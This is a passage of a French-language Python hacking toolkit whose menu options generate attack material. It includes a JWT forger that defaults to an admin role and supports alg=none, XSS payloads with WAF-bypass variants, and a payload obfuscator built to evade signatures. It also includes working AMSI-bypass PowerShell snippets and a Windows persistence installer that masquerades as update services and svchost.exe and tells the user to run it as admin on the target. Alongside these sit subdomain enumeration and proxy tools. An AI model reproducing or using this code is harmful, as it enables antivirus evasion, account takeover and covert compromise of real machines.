    domain = input(f"{YELLOW}[?]{RESET} Domaine racine (ex: exemple.com) {RED}->{RESET} ").strip()
    if not domain:
        print(f"{RED}[!] Domaine vide.{RESET}")
        pause()
        return

    domain = domain.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0].lower()
    if domain.startswith("www."):
        domain = domain[4:]

    print(f"\n{YELLOW}[*] Enumeration de {domain}...{RESET}\n")

    subs = set()
    lock = threading.Lock()

    def add_subs(items):
        with lock:
            subs.update(items)

    def query_crtsh():
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=30)
            if r.status_code == 200:
                for entry in r.json():
                    for n in entry.get("name_value", "").split("\n"):
                        n = n.strip().lower().lstrip("*.")
                        if n.endswith(domain) and "@" not in n:
                            add_subs([n])
                print(f"{GREEN}[+] crt.sh{RESET}")
        except Exception:
            print(f"{YELLOW}[!] crt.sh indisponible{RESET}")

    def query_hackertarget():
        try:
            r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=20)
            if r.status_code == 200 and "error" not in r.text.lower():
                found = []
                for line in r.text.splitlines():
                    if "," in line:
                        host = line.split(",")[0].strip().lower()
                        if host.endswith(domain):
                            found.append(host)
                add_subs(found)
                print(f"{GREEN}[+] hackertarget{RESET}")
        except Exception:
            print(f"{YELLOW}[!] hackertarget indisponible{RESET}")

    def query_rapiddns():
        try:
            r = requests.get(f"https://rapiddns.io/subdomain/{domain}?full=1", timeout=20)
            if r.status_code == 200:
                found = set(re.findall(r"<td>([a-zA-Z0-9\-\.]+\." + re.escape(domain) + r")</td>", r.text))
                add_subs(found)
                print(f"{GREEN}[+] rapiddns{RESET}")
        except Exception:
            print(f"{YELLOW}[!] rapiddns indisponible{RESET}")

    threads = [
        threading.Thread(target=query_crtsh, daemon=True),
        threading.Thread(target=query_hackertarget, daemon=True),
        threading.Thread(target=query_rapiddns, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    subs = sorted(subs)
    if not subs:
        print(f"\n{RED}[!] Aucun sous-domaine trouve.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] {len(subs)} sous-domaines bruts — resolution DNS...{RESET}\n")

    resolved = []
    rlock = threading.Lock()
    done = [0]

    def resolve(sub):
        try:
            ip = socket.gethostbyname(sub)
            with rlock:
                resolved.append({"sub": sub, "ip": ip})
                done[0] += 1
                print(f"{GREEN}[+]{RESET} {sub:<45} {WHITE}{ip}{RESET}")
        except Exception:
            with rlock:
                done[0] += 1
                sys.stdout.write(f"\r{GRAY}  {done[0]}/{len(subs)} testes...{RESET}   ")
                sys.stdout.flush()

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(resolve, subs))

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   RESULTATS — {domain}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    print(f"{GREEN}[+] Total brut   : {WHITE}{len(subs)}{RESET}")
    print(f"{GREEN}[+] Resolus      : {WHITE}{len(resolved)}{RESET}\n")

    for item in sorted(resolved, key=lambda x: x["sub"]):
        print(f"  {GREEN}▸{RESET} {WHITE}{item['sub']:<45}{RESET} {GRAY}{item['ip']}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "SubEnum"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^\w\-.]", "_", domain)[:60]
        out_file = out_dir / f"subdomains_{safe}_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Subdomain Enum — {domain}\n")
            f.write(f"Date : {datetime.now().isoformat()}\n")
            f.write(f"Total : {len(subs)} | Resolus : {len(resolved)}\n")
            f.write("=" * 60 + "\n\n")
            for item in sorted(resolved, key=lambda x: x["sub"]):
                f.write(f"{item['sub']:<45} {item['ip']}\n")
        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()



def option_52():
    clear()
    banner()

    print(f"\n{CYAN}   [ JWT FORGER ]{RESET}\n")
    print(f"{GRAY}  Re-signe un JWT avec un secret connu (HS256/384/512).{RESET}")
    print(f"{GRAY}  Modifie le payload avant signature (role, id, exp...).{RESET}\n")

    secret = input(f"{YELLOW}[?]{RESET} Secret (le HMAC key cracke) {RED}->{RESET} ").strip()
    if not secret:
        print(f"{RED}[!] Secret vide.{RESET}")
        pause()
        return

    print(f"\n{GRAY}Payload JSON (ENTREE pour payload par defaut):{RESET}")
    print(f"{GRAY}  defaut: {{\"sub\":\"1\",\"role\":\"admin\",\"iat\":{int(time.time())}}}{RESET}")
    payload_str = input(f"{YELLOW}[?]{RESET} Payload {RED}->{RESET} ").strip()
    if not payload_str:
        payload_str = json.dumps({
            "sub": "1",
            "role": "admin",
            "iat": int(time.time()),
            "exp": int(time.time()) + 86400 * 365
        })

    try:
        payload = json.loads(payload_str)
    except json.JSONDecodeError as e:
        print(f"{RED}[!] JSON invalide : {e}{RESET}")
        pause()
        return

    print(f"\n{GRAY}Header JSON (ENTREE pour {{\"alg\":\"HS256\",\"typ\":\"JWT\"}}):{RESET}")
    header_str = input(f"{YELLOW}[?]{RESET} Header {RED}->{RESET} ").strip()
    if not header_str:
        header_str = '{"alg":"HS256","typ":"JWT"}'

    try:
        header = json.loads(header_str)
    except json.JSONDecodeError as e:
        print(f"{RED}[!] Header invalide : {e}{RESET}")
        pause()
        return

    alg = header.get("alg", "HS256")

    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()

    if alg == "HS256":
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
    elif alg == "HS512":
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha512).digest()
    elif alg == "none":
        print(f"{PINK}[!] alg=none — signature vide, certaines libs l'acceptent.{RESET}")
        sig = b""
    else:
        print(f"{RED}[!] Algo non supporte : {alg}{RESET}")
        pause()
        return

    token = f"{header_b64}.{payload_b64}.{b64url(sig)}"

    print(f"\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   JWT FORGE{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
    print(f"{GREEN}Header  : {WHITE}{header_b64}{RESET}")
    print(f"{GREEN}Payload : {WHITE}{payload_b64}{RESET}")
    print(f"{GREEN}Algo    : {WHITE}{alg}{RESET}")
    print(f"\n{GREEN}Token forge :{RESET}")
    print(f"{WHITE}{token}{RESET}\n")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "JWTForge"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"jwt_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"JWT Forge — {datetime.now().isoformat()}\n")
            f.write(f"Algo   : {alg}\n")
            f.write(f"Secret : {secret}\n\n")
            f.write(f"Header  : {header_b64}\n")
            f.write(f"Payload : {payload_b64}\n\n")
            f.write(f"Token   : {token}\n")
        print(f"{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception:
        pass

    pause()



XSS_CTX_PAYLOADS = {
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<body onload=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "attribute_double": [
        '"><script>alert(1)</script>',
        '" autofocus onfocus="alert(1)',
        '" onmouseover="alert(1)',
        '" ><img src=x onerror=alert(1)>',
    ],
    "attribute_single": [
        "'><script>alert(1)</script>",
        "' autofocus onfocus='alert(1)",
        "' onmouseover='alert(1)",
    ],
    "js_string": [
        "';alert(1);//",
        "\\';alert(1);//",
        "${alert(1)}",
        "</script><script>alert(1)</script>",
    ],
    "url": [
        "javascript:alert(1)",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
    ],
}

def option_53():
    clear()
    banner()

    print(f"\n{CYAN}   [ XSS PAYLOAD GENERATOR ]{RESET}\n")
    print(f"{GRAY}  Payloads adaptes au contexte d'injection.{RESET}")
    print(f"{GRAY}  Bypass WAF : casing, encodage, alternatives.<{RESET}\n")

    print(f"{WHITE}{BOLD}-- Contexte d'injection --{RESET}\n")
    contexts = list(XSS_CTX_PAYLOADS.keys())
    for i, ctx in enumerate(contexts, 1):
        print(f"  {PINK}({i}){RESET} {ctx}")

    print(f"\n  {PINK}(6){RESET} Tous les contextes")
    print(f"  {PINK}(7){RESET} Custom (payload manuel)")
    print()

    choice = input(f"{YELLOW}[?]{RESET} Choix (1-7) {RED}->{RESET} ").strip() or "1"

    if choice == "7":
        custom = input(f"{YELLOW}[?]{RESET} Payload custom {RED}->{RESET} ").strip()
        if custom:
            print(f"\n{GREEN}[+]{RESET} {custom}")
        pause()
        return

    if choice == "6":
        selected = contexts
    elif choice.isdigit() and 1 <= int(choice) <= len(contexts):
        selected = [contexts[int(choice) - 1]]
    else:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    def bypass_variants(payload):
        variants = set()
        variants.add(payload)
        variants.add(payload.replace("script", "ScRiPt").replace("alert", "aLERT"))
        variants.add(payload.replace("script", "SCRIPT"))
        variants.add(urllib.parse.quote(payload, safe=""))
        if "<" in payload:
            variants.add(payload.replace("<", "&lt;").replace(">", "&gt;"))
        variants.add(payload.replace(" ", "\t"))
        variants.add(payload.replace(" ", "\n"))
        return [v for v in variants if v]

    print(f"\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   PAYLOADS — {', '.join(selected)}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    all_payloads = []
    for ctx in selected:
        print(f"{CYAN}[{ctx}]{RESET}")
        for p in XSS_CTX_PAYLOADS[ctx]:
            print(f"  {WHITE}{p}{RESET}")
            all_payloads.append(p)
        print(f"  {GRAY}-- bypass --{RESET}")
        for base in XSS_CTX_PAYLOADS[ctx][:3]:
            for v in bypass_variants(base)[1:]:
                print(f"  {GRAY}{v}{RESET}")
                all_payloads.append(v)
        print()

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "XSSPayloads"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"payloads_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"XSS Payloads — {datetime.now().isoformat()}\n")
            f.write(f"Contextes : {', '.join(selected)}\n")
            f.write("=" * 60 + "\n\n")
            for p in all_payloads:
                f.write(p + "\n")
        print(f"{GREEN}[+] Export : {out_file}{RESET}")
    except Exception:
        pass

    pause()



def option_54():
    clear()
    banner()

    print(f"\n{CYAN}   [ PYTHON PAYLOAD OBFUSCATOR ]{RESET}\n")
    print(f"{GRAY}  Encode un .py en multi-couches (base64 + zlib + XOR).{RESET}")
    print(f"{GRAY}  Sortie : loader unique, pas de signature statique connue.{RESET}\n")

    src = input(f"{YELLOW}[?]{RESET} Fichier source .py {RED}->{RESET} ").strip().strip('"').strip("'")
    if not src or not os.path.isfile(src):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    try:
        with open(src, "rb") as f:
            raw = f.read()
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    print(f"\n{WHITE}{BOLD}-- Methode d'obfuscation --{RESET}\n")
    print(f"  {PINK}(1){RESET} Base64 simple")
    print(f"  {PINK}(2){RESET} Base64 + zlib")
    print(f"  {PINK}(3){RESET} Base64 + zlib + XOR (cle aleatoire)")
    print(f"  {PINK}(4){RESET} Base64 + zlib + XOR + split chunks")
    print()
    choice = input(f"{YELLOW}[?]{RESET} Choix (1-4, def 3) {RED}->{RESET} ").strip() or "3"

    def b64(data): return base64.b64encode(data).decode()
    def xor_bytes(data, key):
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    def chunk_string(s, n=64):
        return [s[i:i+n] for i in range(0, len(s), n)]

    if choice == "1":
        encoded = b64(raw)
        loader = f'''import base64
exec(compile(base64.b64decode("{encoded}"), "<payload>", "exec"))
'''
    elif choice == "2":
        import zlib
        compressed = zlib.compress(raw, 9)
        encoded = b64(compressed)
        loader = f'''import base64, zlib
exec(compile(zlib.decompress(base64.b64decode("{encoded}")), "<payload>", "exec"))
'''
    elif choice == "3":
        import zlib
        key = os.urandom(16)
        compressed = zlib.compress(raw, 9)
        encrypted = xor_bytes(compressed, key)
        encoded = b64(encrypted)
        key_hex = key.hex()
        loader = f'''import base64, zlib
_KEY = bytes.fromhex("{key_hex}")
_DATA = base64.b64decode("{encoded}")
_DEC = bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(_DATA))
exec(compile(zlib.decompress(_DEC), "<payload>", "exec"))
'''
    else:  # 4
        import zlib
        key = os.urandom(16)
        compressed = zlib.compress(raw, 9)
        encrypted = xor_bytes(compressed, key)
        encoded = b64(encrypted)
        chunks = chunk_string(encoded, 64)
        key_hex = key.hex()
        chunks_block = "\n".join(f'    "{c}",' for c in chunks)
        loader = f'''import base64, zlib
_KEY = bytes.fromhex("{key_hex}")
_CHUNKS = [
{chunks_block}
]
_DATA = base64.b64decode("".join(_CHUNKS))
_DEC = bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(_DATA))
exec(compile(zlib.decompress(_DEC), "<payload>", "exec"))
'''

    base_name = os.path.splitext(os.path.basename(src))[0]
    out_name = f"{base_name}_obf.py"
    out_path = os.path.join(_safe_workdir(), out_name)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(loader)

    print(f"\n{GREEN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{GREEN}{BOLD}   OBFUSCATION TERMINEE{RESET}")
    print(f"{GREEN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
    print(f"  {GREEN}Source    : {WHITE}{src}{RESET}")
    print(f"  {GREEN}Sortie    : {WHITE}{out_path}{RESET}")
    print(f"  {GREEN}Original  : {WHITE}{len(raw):,} bytes{RESET}")
    print(f"  {GREEN}Loader    : {WHITE}{len(loader):,} bytes{RESET}")
    print(f"  {GREEN}Couches   : {WHITE}{choice}{RESET}")

    try:
        if os.name == "nt":
            os.startfile(_safe_workdir())
    except Exception:
        pass

    pause()



def option_55():
    clear()
    banner()

    print(f"\n{CYAN}   [ AMSI BYPASS GENERATOR ]{RESET}\n")
    print(f"{GRAY}  Genere un script PowerShell d'AMSI bypass (in-memory).{RESET}\n")

    print(f"{WHITE}{BOLD}-- Methode --{RESET}\n")
    print(f"  {PINK}(1){RESET} Classic (amsiInitFailed = true)")
    print(f"  {PINK}(2){RESET} Patch EtwEventWrite + amsi.dll buffer")
    print(f"  {PINK}(3){RESET} Patch AmsiScanBuffer (ret 0 / xor eax,eax)")
    print(f"  {PINK}(4){RESET} Obfusque (concat + reverse)")
    print()
    choice = input(f"{YELLOW}[?]{RESET} Choix (1-4, def 3) {RED}->{RESET} ").strip() or "3"

    if choice == "1":
        snippet = r'''
$amsi = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like "AmsiUtils"}
$field = $amsi.GetField("amsiInitFailed", "NonPublic,Static")
$field.SetValue($null, $true)
'''
    elif choice == "2":
        snippet = r'''
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $Win32
$addr = [W]::GetProcAddress([W]::GetModuleHandle("amsi.dll"), "AmsiScanBuffer")
$old = 0
[W]::VirtualProtect($addr, [UIntPtr]0x5, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $addr, 6)
'''
    elif choice == "3":
        snippet = r'''
$k32 = Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
"@ -Name K -Namespace W -PassThru
$amsi = $k32::GetModuleHandle("amsi.dll")
$scan = $k32::GetProcAddress($amsi, "AmsiScanBuffer")
$o = 0
$k32::VirtualProtect($scan, 6, 0x40, [ref]$o) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x31,0xC0,0xC3), 0, $scan, 3)
'''
    else:  # 4
        snippet = r'''
$s = "Amsi"+"Utils"
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like $s}
$f = $a.GetField("amsi"+"Init"+"Failed","NonPublic,Static")
$f.SetValue($null,$true)
'''

    print(f"\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   AMSI BYPASS SNIPPET{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
    print(f"{WHITE}{snippet}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "AMSIBypass"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f"amsi_{int(time.time())}.ps1"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(snippet)
        print(f"{GREEN}[+] Fichier : {out_file}{RESET}")
    except Exception:
        pass

    pause()



def option_56():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ EXPLOIT / CVE SEARCH ]{RESET}\n")
    print(f"{GRAY}  Recherche CVE via l'API CIRCL (cve.circl.lu).{RESET}\n")

    query = input(f"{YELLOW}[?]{RESET} Mot-cle / CVE / produit (ex: log4j, CVE-2021-44228) {RED}->{RESET} ").strip()
    if not query:
        print(f"{RED}[!] Requete vide.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[*] Recherche de '{query}'...{RESET}\n")

    results = []

    if query.upper().startswith("CVE-"):
        try:
            r = requests.get(f"https://cve.circl.lu/api/cve/{query.upper()}", timeout=15)
            if r.status_code == 200 and r.json():
                results = [r.json()]
        except Exception:
            pass
    else:
        try:
            r = requests.get(
                f"https://cve.circl.lu/api/search/{urllib.parse.quote(query)}",
                timeout=15,
            )
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict):
                    results = data.get("results", [])[:50]
                elif isinstance(data, list):
                    results = data[:50]
        except Exception as e:
            print(f"{RED}[!] Erreur API : {e}{RESET}")
            pause()
            return

    if not results:
        print(f"{YELLOW}[!] Aucun resultat.{RESET}")
        pause()
        return

    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   RESULTATS ({len(results)}){RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    for item in results:
        cve_id = item.get("id") or item.get("cveMetadata", {}).get("cveId", "?")
        summary = item.get("summary") or item.get("containers", {}).get("cna", {}).get("descriptions", [{}])[0].get("value", "")
        cvss = item.get("cvss") or 0
        published = (item.get("Published") or item.get("cveMetadata", {}).get("datePublished") or "")[:10]

        sev_color = GREEN if cvss < 4 else (YELLOW if cvss < 7 else PINK)
        print(f"{PINK}[{cve_id}]{RESET} {sev_color}CVSS {cvss}{RESET} {GRAY}{published}{RESET}")
        if summary:
            print(f"  {WHITE}{summary[:200]}{RESET}")
        refs = item.get("references") or item.get("containers", {}).get("cna", {}).get("references", [])
        for ref in refs[:2]:
            url = ref if isinstance(ref, str) else ref.get("url", "")
            if url:
                print(f"  {GRAY}{url[:100]}{RESET}")
        print()

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "CVESearch"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^\w\-]", "_", query)[:40]
        out_file = out_dir / f"cve_{safe}_{int(time.time())}.json"
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"{GREEN}[+] Export : {out_file}{RESET}")
    except Exception:
        pass

    pause()



def option_57():
    clear()
    banner()

    print(f"\n{CYAN}   [ BULK HASH GENERATOR ]{RESET}\n")
    print(f"{GRAY}  Hash en masse un fichier de mots (1 par ligne).{RESET}\n")

    src = input(f"{YELLOW}[?]{RESET} Fichier source {RED}->{RESET} ").strip().strip('"').strip("'")
    if not src or not os.path.isfile(src):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    print(f"\n{WHITE}{BOLD}-- Algorithme --{RESET}\n")
    algos = ["md5", "sha1", "sha256", "sha512", "ntlm", "lm"]
    for i, a in enumerate(algos, 1):
        print(f"  {PINK}({i}){RESET} {a}")
    print(f"  {PINK}(7){RESET} Tous")

    choice = input(f"{YELLOW}[?]{RESET} Choix (1-7, def 7) {RED}->{RESET} ").strip() or "7"

    if choice == "7":
        selected = algos
    elif choice.isdigit() and 1 <= int(choice) <= len(algos):
        selected = [algos[int(choice) - 1]]
    else:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    def compute(word, algo):
        try:
            if algo == "md5":
                return hashlib.md5(word.encode()).hexdigest()
            if algo == "sha1":
                return hashlib.sha1(word.encode()).hexdigest()
            if algo == "sha256":
                return hashlib.sha256(word.encode()).hexdigest()
            if algo == "sha512":
                return hashlib.sha512(word.encode()).hexdigest()
            if algo == "ntlm":
                return hashlib.new("md4", word.encode("utf-16-le")).hexdigest()
            if algo == "lm":
                pwd = word.upper()[:14].ljust(14, "\0").encode("ascii", errors="ignore")
                from Crypto.Cipher import DES
                def part(p):
                    return DES.new(p, DES.MODE_ECB).encrypt(b"KGS!@#$%").hex()
                return part(pwd[:7]) + part(pwd[7:])
        except Exception:
            return ""
        return ""

    print(f"\n{YELLOW}[*] Hash de chaque ligne pour {', '.join(selected)}...{RESET}\n")

    out_lines = []
    try:
        with open(src, "r", encoding="utf-8", errors="ignore") as f:
            words = [ln.rstrip("\r\n") for ln in f if ln.strip()]
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    print(f"{GREEN}[+] {len(words)} mots a hasher.{RESET}\n")

    for i, word in enumerate(words, 1):
        row = {a: compute(word, a) for a in selected}
        out_lines.append(f"{word}:" + ":".join(row[a] for a in selected))
        if i % 100 == 0:
            sys.stdout.write(f"\r{GRAY}  {i}/{len(words)}...{RESET}")
            sys.stdout.flush()

    print(f"\n{GREEN}[+] Termine.{RESET}")

    out_dir = Path(_safe_workdir()) / "Output" / "BulkHash"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_file = out_dir / f"hashed_{int(time.time())}.txt"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(f"# word:" + ":".join(selected) + "\n")
        for line in out_lines:
            f.write(line + "\n")

    print(f"{GREEN}[+] Export : {out_file}{RESET}")
    print(f"{GRAY}[i] Format : <mot>:<hash1>:<hash2>...{RESET}")

    pause()



def option_58():
    clear()
    banner()

    print(f"\n{CYAN}   [ WINDOWS PERSISTENCE INSTALLER ]{RESET}\n")
    print(f"{GRAY}  Genere un script batch d'installation de persistance.{RESET}")
    print(f"{GRAY}  Chemins multiples, redondance en cas de cleanup partiel.{RESET}\n")

    payload = input(f"{YELLOW}[?]{RESET} Chemin de l'exe a rendre persistant {RED}->{RESET} ").strip()
    if not payload:
        print(f"{RED}[!] Chemin vide.{RESET}")
        pause()
        return

    print(f"\n{WHITE}{BOLD}-- Methodes --{RESET}\n")
    print(f"  {PINK}(1){RESET} HKCU Run key")
    print(f"  {PINK}(2){RESET} Scheduled task (logon)")
    print(f"  {PINK}(3){RESET} Startup folder")
    print(f"  {PINK}(4){RESET} WMI event subscription")
    print(f"  {PINK}(5){RESET} Toutes")
    print()

    choice = input(f"{YELLOW}[?]{RESET} Choix (1-5, def 5) {RED}->{RESET} ").strip() or "5"

    methods = []
    if choice == "5":
        methods = ["run", "task", "startup", "wmi"]
    else:
        mapping = {"1": "run", "2": "task", "3": "startup", "4": "wmi"}
        if choice in mapping:
            methods = [mapping[choice]]

    if not methods:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    lines = [
        "@echo off",
        "REM Persistence installer — auto-genere",
        f"REM Target : {payload}",
        "",
        "set PAYLOAD=" + payload,
        "",
    ]

    if "run" in methods:
        lines += [
            'echo [*] HKCU Run key...',
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinUpdateSvc /t REG_SZ /d "%PAYLOAD%" /f >nul',
            "",
        ]
    if "task" in methods:
        lines += [
            'echo [*] Scheduled task...',
            'schtasks /Create /SC ONLOGON /TN "WindowsUpdateCheck" /TR "%PAYLOAD%" /RL HIGHEST /F >nul 2>&1',
            "",
        ]
    if "startup" in methods:
        lines += [
            'echo [*] Startup folder...',
            'copy /Y "%PAYLOAD%" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe" >nul 2>&1',
            "",
        ]
    if "wmi" in methods:
        lines += [
            'echo [*] WMI event subscription...',
            'powershell -Command "$f = \\"%PAYLOAD%\\"; $c = Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name=WSvcFilter\\" -ErrorAction SilentlyContinue; if (-not $c) { $c = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name=\\"WSvcFilter\\";EventNamespace=\\"root\\\\cimv2\\";QueryLanguage=\\"WQL\\";Query=\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'\\"} }; $d = Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\"Name=WSvcConsumer\\" -ErrorAction SilentlyContinue; if (-not $d) { $d = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name=\\"WSvcConsumer\\";CommandLineTemplate=$f} }; $b = Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter \\"Filter=\'__EventFilter.Name=\\\\\\"WSvcFilter\\\\\\"\'\\" -ErrorAction SilentlyContinue; if (-not $b) { Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$c;Consumer=$d} | Out-Null }" >nul 2>&1',
            "",
        ]

    lines += [
        "echo [+] Persistence installee.",
        "exit /b 0",
    ]

    batch = "\n".join(lines)

    out_dir = Path(_safe_workdir()) / "Output" / "Persistence"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_file = out_dir / f"persist_{int(time.time())}.bat"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(batch)

    print(f"\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   PERSISTENCE SCRIPT{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")
    print(f"{WHITE}{batch}{RESET}\n")
    print(f"{GREEN}[+] Fichier : {out_file}{RESET}")
    print(f"{GRAY}[i] Execute-le en admin sur la cible : persist.bat{RESET}")

    pause()



def option_59():
    clear()
    banner()

    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ IP ROTATOR — PROXY PICKER ]{RESET}\n")
    print(f"{GRAY}  Teste une liste de proxies et classe par latence.{RESET}\n")

    src = input(f"{YELLOW}[?]{RESET} Fichier proxy.txt (1 par ligne) {RED}->{RESET} ").strip().strip('"').strip("'")
    if not src or not os.path.isfile(src):
        print(f"{RED}[!] Fichier introuvable.{RESET}")
        pause()
        return

    try:
        with open(src, "r", encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip() and ":" in ln]
    except Exception as e:
        print(f"{RED}[!] Lecture impossible : {e}{RESET}")
        pause()
        return

    if not proxies:
        print(f"{RED}[!] Aucun proxy dans le fichier.{RESET}")
        pause()
        return

    print(f"{GREEN}[+] {len(proxies)} proxies charges.{RESET}\n")

    try:
        max_lat = int(input(f"{YELLOW}[?]{RESET} Latence max ms (def 3000) {RED}->{RESET} ").strip() or "3000")
    except ValueError:
        max_lat = 3000

    try:
        limit = int(input(f"{YELLOW}[?]{RESET} Nombre a tester (def tous) {RED}->{RESET} ").strip() or str(len(proxies)))
    except ValueError:
        limit = len(proxies)

    to_test = proxies[:limit]

    print(f"\n{CYAN}[*] Test de {len(to_test)} proxies (max {max_lat}ms)...{RESET}\n")

    valid = []
    lock = threading.Lock()
    done = [0]

    def check(proxy):
        proto = "http"
        if proxy.startswith("socks4://"): proto = "socks4"
        elif proxy.startswith("socks5://"): proto = "socks5"

        url_proxy = proxy if "://" in proxy else f"http://{proxy}"

        try:
            start = time.time()
            r = requests.get(
                "https://api.ipify.org?format=json",
                proxies={"http": url_proxy, "https": url_proxy},
                timeout=max_lat / 1000,
                headers={"User-Agent": "Mozilla/5.0"},
            )
            lat = int((time.time() - start) * 1000)
            if r.status_code == 200:
                ip = r.json().get("ip", "?")
                with lock:
                    valid.append({"proxy": url_proxy, "proto": proto, "latency": lat, "out_ip": ip})
                    done[0] += 1
                    print(f"{GREEN}[+]{RESET} {url_proxy:<45} {CYAN}{lat:>5}ms{RESET} {GRAY}{ip}{RESET}")
                    return
        except Exception:
            pass
        with lock:
            done[0] += 1
